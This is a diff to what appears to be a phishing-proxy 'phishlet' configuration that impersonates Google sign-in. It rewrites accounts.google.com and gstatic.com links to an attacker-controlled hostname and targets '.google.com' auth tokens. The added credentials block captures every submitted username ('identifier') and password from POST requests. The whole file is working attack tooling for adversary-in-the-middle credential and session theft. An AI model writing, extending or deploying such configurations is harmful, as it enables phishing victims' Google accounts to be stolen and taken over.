@@ -1,5 +1,5 @@
-name: google
-author: kgretzky
+name: 'google'
+author: 'kgretzky'
 min_ver: '2.4.0'
 
 proxy_hosts:
@@ -12,6 +12,16 @@ sub_filters:
   - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://accounts.google.com/_/scs/abc-static', replace: 'https://{hostname}/_/scs/abc-static', mimes: ['text/html'], redirect: false}
   - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://ssl.gstatic.com', replace: 'https://{hostname_starts_with: ssl}.gstatic.com', mimes: ['text/html'], redirect: false}
   - {triggers_on: 'ssl.gstatic.com', orig_sub: 'ssl', domain: 'gstatic.com', search: '/', replace: '', mimes: ['image/jpeg', 'image/png', 'image/svg+xml', 'text/css'], redirect: true}
+
+credentials:
+  username:
+    key: 'identifier'
+    search: ['.*']
+    type: 'post'
+  password:
+    key: 'password'
+    search: ['.*']
+    type: 'post'
 
 auth_tokens:
   - domain: '.google.com'
